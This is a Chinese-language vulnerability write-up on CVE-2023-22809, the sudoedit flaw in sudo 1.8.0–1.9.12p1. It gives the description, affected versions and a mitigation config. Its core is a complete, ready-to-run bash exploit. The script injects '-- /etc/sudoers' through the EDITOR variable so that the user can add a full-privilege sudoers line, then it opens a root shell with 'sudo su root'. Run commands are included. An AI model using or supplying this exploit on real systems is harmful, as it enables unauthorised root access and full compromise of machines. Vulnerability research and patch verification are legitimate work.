# Linux Sudo 权限提升漏洞 CVE-2023-22809

## 漏洞描述

Sudo 存在权限提升漏洞，攻击者可过特定的 payload 获取服务器 root 权限。

Sudo 中的 sudoedit 对处理用户提供的环境变量（如`SUDO_EDITOR`、`VISUAL`和`EDITOR`）中传递的额外参数存在缺陷。当用户指定的编辑器包含绕过 sudoers 策略的 " –" 参数时，拥有sudoedit 访问权限的本地攻击者可通过将任意条目附加到要处理的文件列表中，最终在目标系统上实现权限提升。该漏洞还影响部分 QNAP 操作系统：QTS、QuTS hero、QuTScloud、QVP（QVR Pro 设备）。

## 漏洞影响

```
Sudo:
1.8.0~1.9.12p1 均受影响

QTS 与 QuTS hero：
QTS < 5.0.1.2346 build 20230322
QuTS < hero h5.0.1.2348 build 20230324
```

## 漏洞复现

exp.sh：

```
#!/usr/bin/env bash
#
# Exploit Title: sudo 1.8.0 - 1.9.12p1 - Privilege Escalation
# 
# Exploit Author: n3m1.sys
# CVE: CVE-2023-22809
# Date: 2023/01/21
# Vendor Homepage: https://www.sudo.ws/
# Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz
# Version: 1.8.0 to 1.9.12p1
# Tested on: Ubuntu Server 22.04 - vim 8.2.4919 - sudo 1.9.9
#
# Running this exploit on a vulnerable system allows a localiattacker to gain 
# a root shell on the machine.
#
# The exploit checks if the current user has privileges to run sudoedit or 
# sudo -e on a file as root. If so it will open the sudoers file for the
# attacker to add a line to gain privileges on all the files and get a root 
# shell.

if ! sudo --version | head -1 | grep -qE '(1\.8.*|1\.9\.[0-9]1?(p[1-3])?|1\.9\.12p1)$'
then
    echo "> Currently installed sudo version is not vulnerable"
    exit 1
fi

EXPLOITABLE=$(sudo -l | grep -E "sudoedit|sudo -e" | grep -E '\(root\)|\(ALL\)|\(ALL : ALL\)' | cut -d ')' -f 2-)

if [ -z "$EXPLOITABLE" ]; then
    echo "> It doesn't seem that this user can run sudoedit as root"
    read -p "Do you want to proceed anyway? (y/N): " confirm && [[ $confirm == [yY] ]] || exit 2
else
    echo "> BINGO! User exploitable"
fi

echo "> Opening sudoers file, please add the following line to the file in order to do the privesc:"
echo "$USER ALL=(ALL:ALL) ALL"
read -n 1 -s -r -p "Press any key to continue..."
EDITOR="vim -- /etc/sudoers" $EXPLOITABLE
sudo su root
exit 0
```

查看本地 sudo 版本：

```
sudo -V
```

执行文件：

```
./exp.sh
```

## 修复建议

使用 sudoedit 时，将受影响的环境变量添加到 env_delete 拒绝列表中，例如：

```
Defaults!SUDOEDIT env_delete+="SUDO_EDITOR VISUAL EDITOR"
Cmnd_Alias SUDOEDIT = sudoedit /etc/custom/service.conf
user ALL=(ALL:ALL) SUDOEDIT
```

